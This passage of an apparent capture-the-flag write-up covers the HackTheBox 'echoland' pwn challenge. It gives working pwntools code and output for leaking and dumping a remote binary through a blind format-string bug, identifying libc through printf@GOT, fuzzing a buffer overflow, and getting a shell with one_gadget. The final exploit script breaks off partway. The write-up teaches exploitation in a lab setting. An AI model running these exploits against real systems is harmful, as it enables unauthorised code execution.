+<li>It executes the function leak_pointer_to_main() at line 64 and adds addr variables to the returned by the function address of main.</li>
+<li>This addr variable is returned by the search_elf_magic_bytes and it is being decremented by 0x100 until it finds ELF magic bytes, then it will return the calculated pointer to those bytes.</li>
+<li>search_elf_magic_bytes handles exceptions, because during pointer deference using %s at line 42 there is a big chance of a Segmentation fault because not every location points to a valid string array.</li>
+<li>There is a nice trick at line 45 if you are using Python 3 and working with bytes, to decode those bytes using “unicode_escape” . Usually, it will give better results than “ASCII” or “UTF-8” .</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]</span><br><span class="line">└─<span class="comment"># python3 dumpbinary.py </span></span><br><span class="line">CURRENT ADDRESS = 0x0</span><br><span class="line">Leaked main address: 0x556120bbf400</span><br><span class="line">Deferenced pointer: ó\x0fúAWL=k)\x00</span><br><span class="line">Deferenced pointer: uÐèYÿÿÿÇEü\x00</span><br><span class="line">Deferenced pointer: ó\x0fú=\x1d\x00</span><br><span class="line">Deferenced pointer: ó\x0fúòÿ%.\x00</span><br><span class="line">Deferenced pointer: ó\x0fúHH\x05\x99/\x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: ð?\x00</span><br><span class="line">Deferenced pointer: ble\x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x04</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x7fELF\x00</span><br><span class="line">MAGIC BYTES FOUND @: 0x556120bbe000</span><br></pre></td></tr></table></figure>
+
+<p>As you can see above, magic bytes were found and from this point, you can begin leaking bytes to re-create the binary on your machine.</p>
+<h3 id="3-Blind-Format-String-—-dumping-the-binary"><a href="#3-Blind-Format-String-—-dumping-the-binary" class="headerlink" title="3. Blind Format String — dumping the binary:"></a>3. Blind Format String — dumping the binary:</h3><p>By leaking the pointer address to the ELF header you can actually dump the binary code and then decompile it using Ghidra&#x2F;IDA&#x2F;Binary ninja or any other RE tool that you like.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def dump_binary(magic_bytes_addr):</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;Dump the binary data&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    base = magic_bytes_addr</span><br><span class="line">    leak,leaked = bytearray(),bytearray()</span><br><span class="line">    offset = len(leaked)</span><br><span class="line">    <span class="keyword">while</span> offset &lt;= 0x5000:</span><br><span class="line">        with open(<span class="string">&quot;leak.bin&quot;</span>, <span class="string">&quot;ab&quot;</span>) as l:</span><br><span class="line">            addr = p64(base + len(leaked))</span><br><span class="line">            leak_part = b<span class="string">&quot;%9<span class="variable">$sEOF</span>\x00&quot;</span></span><br><span class="line">            p.sendline(leak_part + addr)</span><br><span class="line">            resp = p.recvuntil(b<span class="string">&quot;1. Scream.\n2. Run outside.\n&gt; &quot;</span>)</span><br><span class="line">            leak = resp.split(b<span class="string">&quot;EOF&quot;</span>)[0] + b<span class="string">&quot;\x00&quot;</span></span><br><span class="line">            leaked.extend(leak)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Address: &quot;</span> + hex(unpack(<span class="string">&quot;&lt;Q&quot;</span>,addr.ljust(8,b<span class="string">&quot;\x00&quot;</span>))[0]) + <span class="string">&quot; - Offset: &quot;</span> + str(offset) + <span class="string">&quot;:&quot;</span> + hex(offset)+ <span class="string">&quot; - Leaked data: &quot;</span> + leak.decode(<span class="string">&quot;unicode_escape&quot;</span>))</span><br><span class="line">            l.write(leak)</span><br><span class="line">            l.flush()</span><br><span class="line">            offset = len(leaked)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump binary:</span></span><br><span class="line">dump_binary(start_main_addr)</span><br></pre></td></tr></table></figure>
+
+<p>Using pointer deference at line 77 and proper stack alignment at line 78 dump raw bytes of remote binary to your machine.</p>
+<p>The whole binary got the length of 0x5000 bytes, that is why while loop count to 0x5000 at line 74.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]</span><br><span class="line">└─<span class="comment"># python3 dumpbinary.py                                                                                           </span></span><br><span class="line">CURRENT ADDRESS = 0x0</span><br><span class="line">Leaked main address: 0x55edf90c8400</span><br><span class="line">Deferenced pointer: ó\x0fúAWL=k)\x00</span><br><span class="line">Deferenced pointer: uÐèYÿÿÿÇEü\x00</span><br><span class="line">Deferenced pointer: ó\x0fú=\x1d\x00</span><br><span class="line">Deferenced pointer: ó\x0fúòÿ%.\x00</span><br><span class="line">Deferenced pointer: ó\x0fúHH\x05\x99/\x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: ð?\x00</span><br><span class="line">Deferenced pointer: ble\x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x04</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x7fELF\x00</span><br><span class="line">MAGIC BYTES FOUND @: 0x55edf90c7000</span><br><span class="line">Address: 0x55edf90c7000 - Offset: 0:0x0 - Leaked data: \x7fELF\x00</span><br><span class="line">Address: 0x55edf90c7008 - Offset: 8:0x8 - Leaked data: \x00</span><br><span class="line">Address: 0x55edf90c7009 - Offset: 9:0x9 - Leaked data: \x00</span><br><span class="line">Address: 0x55edf90c700a - Offset: 10:0xa - Leaked data: \x00</span><br><span class="line">Address: 0x55edf90c700b - Offset: 11:0xb - Leaked data: \x00</span><br><span class="line">Address: 0x55edf90c700c - Offset: 12:0xc - Leaked data: \x00</span><br><span class="line">Address: 0x55edf90c700d - Offset: 13:0xd - Leaked data: \x00</span><br><span class="line">Address: 0x55edf90c700e - Offset: 14:0xe - Leaked data: \x00</span><br><span class="line">Address: 0x55edf90c700f - Offset: 15:0xf - Leaked data: \x00</span><br><span class="line">Address: 0x55edf90c7010 - Offset: 16:0x10 - Leaked data: \x03</span><br><span class="line">Address: 0x55edf90c7012 - Offset: 18:0x12 - Leaked data: &gt;\x00</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>You can watch the dump file slowly growing using tail -f leak.bin | xxd command.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]</span><br><span class="line">└─<span class="comment"># tail -f leak.bin | xxd</span></span><br><span class="line">00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............</span><br><span class="line">00000010: 0300 3e00 0100 0000 6011 0000 0000 0000  ..&gt;.....`.......</span><br><span class="line">00000020: 4000 0000 0000 0000 883b 0000 0000 0000  @........;......</span><br><span class="line">00000030: 0000 0000 4000 3800 0d00 4000 1f00 1e00  ....@.8...@.....</span><br><span class="line">00000040: 0600 0000 0400 0000 4000 0000 0000 0000  ........@.......</span><br><span class="line">00000050: 4000 0000 0000 0000 4000 0000 0000 0000  @.......@.......</span><br></pre></td></tr></table></figure>
+
+<p>Voilà, now you can use this leaked file to decompile it using Binary Ninja.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]</span><br><span class="line">└─<span class="comment"># file echoland</span></span><br><span class="line">echoland: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=10fa1c1fe305a86450ba9c555e3932a3e5c2633a, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Reverse-the-leaked-binary"><a href="#4-Reverse-the-leaked-binary" class="headerlink" title="4. Reverse the leaked binary:"></a>4. Reverse the leaked binary:</h3><p>Open the leaked file using any decompiler on leak.bin for example, Binary Ninja and click on _start symbol (Ghidra couldn’t analyze this so well like Binary Ninja and this is not an advertisement ^^):</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland.jpg"></li>
+</ul>
+<p>As you can see this is a typical main function loader and data_12ef should be the pointer to the main() (if you can’t see the screen below, click p ):</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland1.jpg"></li>
+</ul>
+<p>When you double click on this address it will redirect you to another one, double click it again and you will see the main() :</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland2.jpg"></li>
+</ul>
+<p>Now a bit of Reverse Engineering to get the printf@GOT and then deference it to get the last 3 bytes of printf function address, so you can get the idea of what libc version is being used on the target system.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland3.jpg"></li>
+</ul>
+<p>Above you can see main() — this is the corresponding code to the “Welcome message” where you chose between two options and leak data using format string vulnerability.</p>
+<p>At the offset 0000133c and the offset 000013ad you can see sub_1100 call.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland4.jpg"></li>
+</ul>
+<p>This is the call you are looking for — printf@PLT and you can guess it because 1. it prints data at 0000133c 2. decompiled code is vulnerable to format string at line 000013ad .</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland5.jpg"></li>
+</ul>
+<p>Above you can see an example of a vulnerable C code from OWASP, can you see the similarities? :)</p>
+<p>If yes, go on and double click on sub_1100() to get into the stub.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland6.jpg"></li>
+</ul>
+<p>As you can see now if you double-click on data_3fa8 you should be redirected to the GOT table…</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland7.jpg"></li>
+</ul>
+<p>… and indeed, here you are. 0003fa8 offset is the printf@GOT .</p>
+<h3 id="5-Get-the-target-libc"><a href="#5-Get-the-target-libc" class="headerlink" title="5. Get the target libc:"></a>5. Get the target libc:</h3><p>The below function will calculate the proper address of printf@plt during runtime, it is just adding printf@GOT offset to the leaked before the address of ELF magic bytes, which are start_main_addr :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># After reversing - 0x00003fa8</span></span><br><span class="line">def leak_printf_got(start_main_addr):</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;Leak printf@GOT - which is dynamically linked during runtime&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    printf_GOT = 0x00003fa8</span><br><span class="line">    printf_addr = start_main_addr + printf_GOT</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Leaked printf address: &quot;</span> + hex(printf_addr))</span><br><span class="line">    leak_part = b<span class="string">&quot;%9<span class="variable">$sEOF</span>\x00&quot;</span></span><br><span class="line">    p.sendline(leak_part + p64(printf_addr))</span><br><span class="line">    resp = p.recv()<span class="comment">#until(b&quot;1. Scream.\n2. Run outside.\n&gt; &quot;)</span></span><br><span class="line">    leak = resp.split(b<span class="string">&quot;EOF&quot;</span>)[0] + b<span class="string">&quot;\x00&quot;</span></span><br><span class="line">    libc_printf = hex(u64(leak.ljust(8,b<span class="string">&quot;\x00&quot;</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!!!] Leaked libc printf : &quot;</span> + libc_printf)</span><br><span class="line">    <span class="built_in">return</span> int(libc_printf,16)</span><br><span class="line"></span><br><span class="line">libc_printf = leak_printf_got(start_main_addr)</span><br></pre></td></tr></table></figure>
+
+<p>As you can see below, it works, you get the printf() from remote libc.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]</span><br><span class="line">└─<span class="comment"># python3 dumpbinary.py </span></span><br><span class="line">CURRENT ADDRESS = 0x0</span><br><span class="line">Leaked main address: 0x55f8dd753400</span><br><span class="line">Deferenced pointer: ó\x0fúAWL=k)\x00</span><br><span class="line">Deferenced pointer: uÐèYÿÿÿÇEü\x00</span><br><span class="line">Deferenced pointer: ó\x0fú=\x1d\x00</span><br><span class="line">Deferenced pointer: ó\x0fúòÿ%.\x00</span><br><span class="line">Deferenced pointer: ó\x0fúHH\x05\x99/\x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: ð?\x00</span><br><span class="line">Deferenced pointer: ble\x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x04</span><br><span class="line">Deferenced pointer: \x00</span><br><span class="line">Deferenced pointer: \x7fELF\x00</span><br><span class="line">MAGIC BYTES FOUND @: 0x55f8dd752000</span><br><span class="line">Leaked <span class="built_in">printf</span> address: 0x55f8dd755fa8</span><br><span class="line">[!!!] Leaked libc <span class="built_in">printf</span> : 0x7fe7f9a4bf70</span><br></pre></td></tr></table></figure>
+
+<p>Now use the last three bytes to query the libc database to check what version of libc is being used on the target system:</p>
+<ul>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZS8=">libc database search<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland8.jpg"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/echoland9.jpg"></p>
+</li>
+</ul>
+<p>As you can see above, there are 5 different libc to choose from I was sure, the target system was AMD so I picked 3rd one.</p>
+<p>In the situation when you have more potentially valid libc to choose from, you can try to decompile more functions from dumped leak.bin and using %s leak their address during runtime, then you should get only one libc.</p>
+<p>Click on this libc and download it. It will be used later to calculate the <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RhdmlkOTQyai9vbmVfZ2FkZ2V0">one_gadget<i class="fa fa-external-link-alt"></i></span> address.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9saWJjLmJsdWthdC5tZS9kL2xpYmM2XzIuMjctM3VidW50dTEuNF9hbWQ2NC5zbw==">libc6_2.27-3ubuntu1.4_amd64.so<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<h3 id="6-Spot-the-second-vulnerability-—-buffer-overflow"><a href="#6-Spot-the-second-vulnerability-—-buffer-overflow" class="headerlink" title="6. Spot the second vulnerability — buffer overflow:"></a>6. Spot the second vulnerability — buffer overflow:</h3><p>The second vulnerability could be found for example by fuzzing the app.</p>
+<p>Below is my quick and dirty Buffer overflow fuzzer which fuzz the first option with chars between 30–100 length:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">def fuzz_buffer_overflow(ip,port):</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;Find the offset of RIP overflow&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(30,100):</span><br><span class="line">        try:</span><br><span class="line">            p = remote(ip,port)</span><br><span class="line">            p.sendline(b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">            <span class="built_in">sleep</span>(0.3)</span><br><span class="line">            p.recv()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;FUZZING: &quot;</span> + str(i))</span><br><span class="line">            p.sendline(cyclic(i))</span><br><span class="line">            <span class="built_in">sleep</span>(0.3)</span><br><span class="line">            data = p.recv()</span><br><span class="line">            <span class="built_in">print</span>(data.decode(<span class="string">&quot;unicode_escape&quot;</span>))</span><br><span class="line">            <span class="keyword">if</span> b<span class="string">&quot;Segmentation&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;========================\nBuffer overflow found @: &quot;</span> + str(i) + <span class="string">&quot;\n========================&quot;</span>)</span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">            p.close()</span><br><span class="line">        except:</span><br><span class="line">            p.close()</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">fuzz_buffer_overflow(ip,port)</span><br></pre></td></tr></table></figure>
+
+<p>As you can see there is potential buffer overflow at offset 64:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]</span><br><span class="line">└─<span class="comment"># python3 fuzzing.py</span></span><br><span class="line">......</span><br><span class="line">FUZZING: 63</span><br><span class="line"></span><br><span class="line">1. Scream.</span><br><span class="line">2. Run outside.</span><br><span class="line">&gt; &gt;&gt; Your friend did not recognize you and ran the other way!</span><br><span class="line"></span><br><span class="line">FUZZING: 64</span><br><span class="line"></span><br><span class="line">1. Scream.</span><br><span class="line">2. Run outside.</span><br><span class="line">&gt; &gt;&gt; Your friend did not recognize you and ran the other way!</span><br><span class="line">/home/ctf/run_challenge.sh: line 2:    95 Segmentation fault      ./echoland</span><br><span class="line"></span><br><span class="line">========================</span><br><span class="line">Buffer overflow found @: 64</span><br><span class="line">========================</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-Get-the-RCE-—-calculate-one-gadget"><a href="#7-Get-the-RCE-—-calculate-one-gadget" class="headerlink" title="7. Get the RCE — calculate one_gadget:"></a>7. Get the RCE — calculate one_gadget:</h3><p>The last step to gain control over the target binary execution flow is to calculate the address of one_gadget.</p>
+<p>First use one_gadget on the leaked binary:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/echoland]</span><br><span class="line">└─<span class="comment"># one_gadget libc6_2.27-3ubuntu1.4_amd64.so </span></span><br><span class="line">0x4f3d5 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f432 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a41c execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>
+
+<p>Always choose the address with fewer conditions that should be fulfilled.</p>
+<p>In above example 0x4f3d5 offset is promising because it needs only one null byte at the rsp+0x40</p>
+<p>You can actually overflow those bytes during Buffer Overflow, below was added 0x70 bytes after the one_gadget:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def get_rce(libc_printf):</span><br><span class="line">    printf_libc_offset = 0x0000000000064f70</span><br><span class="line">    one_gadget = 0x4f432</span><br><span class="line">    rce = libc_printf - printf_libc_offset + one_gadget</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;CALCULATED RCE: &quot;</span> + hex(rce))</span><br><span class="line">    p.sendline(b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(b<span class="string">&quot;A&quot;</span>*64 +p64(0x0000000000064f70) + p64(rce) + b<span class="string">&quot;\x00&quot;</span>*0x70)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">get_rce(libc_printf)</span><br></pre></td></tr></table></figure>
+
+<p>The last thing to mention, 65–72 bytes are overflowing probably Frame Pointer and it has to be valid — it should be in the binary memory address space range.</p>
+<p>73–80 bytes have to be overflowed with one_gadget — this is actually control over the instruction pointer.</p>
+<p>Above, at line 139 I picked just a random low address (printf@GOT) but you could probably overflow this with the one_gadget.</p>
+<p>final exp:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from struct import *</span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line">context.update(<span class="built_in">arch</span> = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">ip, port = <span class="string">&quot;138.68.129.154:31898&quot;</span>.<span class="built_in">split</span>(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">def leak_pointers_from_stack(ip,port):</span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="string">&#x27;Format string - leak pointers to get the libc/main address and architecture.&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0,20):</span><br><span class="line">        try:</span><br><span class="line">            p = remote(ip,port)</span><br><span class="line">            p.sendline(<span class="string">&quot;%&#123;&#125;<span class="variable">$p</span>&quot;</span>.format(i).encode()) </span><br><span class="line">            <span 